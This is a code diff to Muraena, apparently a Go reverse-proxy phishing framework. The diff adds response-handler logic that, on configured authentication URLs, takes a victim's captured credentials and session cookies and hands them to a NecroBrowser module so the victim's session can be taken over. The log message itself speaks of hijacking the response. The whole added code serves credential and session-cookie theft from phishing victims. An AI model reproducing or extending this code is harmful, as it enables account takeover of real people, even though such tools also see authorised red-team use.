@@ -2,6 +2,7 @@ package proxy
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"net/http"
@@ -13,6 +14,7 @@ import (
 	"github.com/evilsocket/islazy/tui"
 	. "github.com/logrusorgru/aurora"
 	"github.com/muraenateam/muraena/core"
+	"github.com/muraenateam/muraena/module/necrobrowser"
 	"github.com/pkg/errors"
 
 	"github.com/muraenateam/muraena/core/db"
@@ -318,6 +320,39 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 			muraena.Tracker.PushCookie(victim, sessCookie)
 		}
+
+		if muraena.Session.Config.Tracking.Enabled && muraena.Session.Config.NecroBrowser.Enabled {
+			m, err := muraena.Session.Module("necrobrowser")
+			if err != nil {
+				log.Error("%s", err)
+			} else {
+				nb, ok := m.(*necrobrowser.Necrobrowser)
+				if ok {
+
+					getSession := false
+					for _, c := range muraena.Session.Config.Tracking.Urls.AuthSessionResponse {
+						if response.Request.URL.Path == c {
+							log.Debug("Going to hijack response: %s (Victim: %+v)", response.Request.URL.Path, victim.ID)
+							getSession = true
+							break
+						}
+					}
+
+					if getSession {
+						// Pass credentials
+						creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
+						if err != nil {
+							log.Warning(err.Error())
+						} else {
+							victim.GetVictimCookiejar()
+							go nb.Instrument(victim.ID, victim.Cookies, string(creds))
+						}
+					}
+				}
+			}
+		}
+
+
 	} else {
 		if len(response.Cookies()) > 0 {
 			log.Debug("[TODO] Missing cookies to track: \n%s\n%+v", response.Request.URL, response.Cookies())
